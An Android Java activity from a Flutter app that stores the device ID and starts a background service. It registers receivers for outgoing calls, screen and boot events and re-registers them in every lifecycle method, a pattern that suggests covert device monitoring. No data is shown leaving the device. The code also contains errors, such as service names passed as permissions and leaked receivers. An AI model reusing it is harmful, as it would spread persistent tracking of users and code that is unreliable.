package com.devil.win ;

import static android.Manifest.permission.FOREGROUND_SERVICE;
import static android.Manifest.permission.POST_NOTIFICATIONS;
import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.WAKE_LOCK;
import static android.provider.Settings.Secure.ANDROID_ID;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import io.flutter.embedding.android.FlutterFragmentActivity;
public class MainActivity extends FlutterFragmentActivity {

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        @SuppressLint("HardwareIds") String android_id = Settings.Secure.getString(getBaseContext().getContentResolver(),
                ANDROID_ID);
        SharedPreferences pref = getApplicationContext().getSharedPreferences("MyPref", 0); // 0 - for private mode
        SharedPreferences.Editor editor = pref.edit();

        editor.putString("device_id", android_id);
        editor.apply();
        Context context = getApplicationContext();
        Intent intent = new Intent(this, MyService.class); // Build the intent for the service

        intent.putExtra("device_id", android_id );
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            context.startForegroundService(intent);
        } else {
            startService(intent);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this,new String[]{
                    POST_NOTIFICATIONS,
                    WAKE_LOCK,
                    STORAGE_SERVICE,
                    FOREGROUND_SERVICE,
                    NOTIFICATION_SERVICE
            },1);
        } else {
            ActivityCompat.requestPermissions(this,new String[]{
                    POST_NOTIFICATIONS,
                    WAKE_LOCK,
                    STORAGE_SERVICE,
                    FOREGROUND_SERVICE,
                    NOTIFICATION_SERVICE
            },1);
        }

        if (ActivityCompat.checkSelfPermission(this, READ_SMS) != PackageManager.PERMISSION_GRANTED ) {
            return;
        }


        IntentFilter intentFilter = new IntentFilter("android.intent.action.BATTERY_CHANGED");
        MYBroadCaster obbj = new MYBroadCaster();
        registerReceiver(obbj, intentFilter);



        IntentFilter int1 = new IntentFilter("android.intent.action.SCREEN_ON");
        registerReceiver(obbj, int1);

        IntentFilter int2 = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
        registerReceiver(obbj, int2);

        IntentFilter int3 = new IntentFilter("android.intent.action.SCREEN_OFF");
        registerReceiver(obbj, int3);

        IntentFilter int4 = new IntentFilter("android.intent.action.BOOT_COMPLETED");
        registerReceiver(obbj, int4);


    }

    @Override
    protected void onPause() {
        super.onPause();
        IntentFilter intentFilter = new IntentFilter("android.intent.action.BATTERY_CHANGED");
        MYBroadCaster obbj = new MYBroadCaster();
        registerReceiver(obbj, intentFilter);
        IntentFilter int1 = new IntentFilter("android.intent.action.SCREEN_ON");
        registerReceiver(obbj, int1);

        IntentFilter int2 = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
        registerReceiver(obbj, int2);

        IntentFilter int3 = new IntentFilter("android.intent.action.SCREEN_OFF");
        registerReceiver(obbj, int3);

        IntentFilter int4 = new IntentFilter("android.intent.action.BOOT_COMPLETED");
        registerReceiver(obbj, int4);
    }

    @Override
    protected void onStop() {
        super.onStop();
        IntentFilter intentFilter = new IntentFilter("android.intent.action.BATTERY_CHANGED");
        MYBroadCaster obbj = new MYBroadCaster();
        registerReceiver(obbj, intentFilter);
        IntentFilter int1 = new IntentFilter("android.intent.action.SCREEN_ON");
        registerReceiver(obbj, int1);

        IntentFilter int2 = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
        registerReceiver(obbj, int2);

        IntentFilter int3 = new IntentFilter("android.intent.action.SCREEN_OFF");
        registerReceiver(obbj, int3);

        IntentFilter int4 = new IntentFilter("android.intent.action.BOOT_COMPLETED");
        registerReceiver(obbj, int4);

    }

    @Override
    protected void onRestart() {
        super.onRestart();
        IntentFilter intentFilter = new IntentFilter("android.intent.action.BATTERY_CHANGED");
        MYBroadCaster obbj = new MYBroadCaster();
        registerReceiver(obbj, intentFilter);
        IntentFilter int1 = new IntentFilter("android.intent.action.SCREEN_ON");
        registerReceiver(obbj, int1);

        IntentFilter int2 = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
        registerReceiver(obbj, int2);

        IntentFilter int3 = new IntentFilter("android.intent.action.SCREEN_OFF");
        registerReceiver(obbj, int3);

        IntentFilter int4 = new IntentFilter("android.intent.action.BOOT_COMPLETED");
        registerReceiver(obbj, int4);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        IntentFilter intentFilter = new IntentFilter("android.intent.action.BATTERY_CHANGED");
        MYBroadCaster obbj = new MYBroadCaster();
        registerReceiver(obbj, intentFilter);
        IntentFilter int1 = new IntentFilter("android.intent.action.SCREEN_ON");
        registerReceiver(obbj, int1);

        IntentFilter int2 = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
        registerReceiver(obbj, int2);

        IntentFilter int3 = new IntentFilter("android.intent.action.SCREEN_OFF");
        registerReceiver(obbj, int3);

        IntentFilter int4 = new IntentFilter("android.intent.action.BOOT_COMPLETED");
        registerReceiver(obbj, int4);
    }
}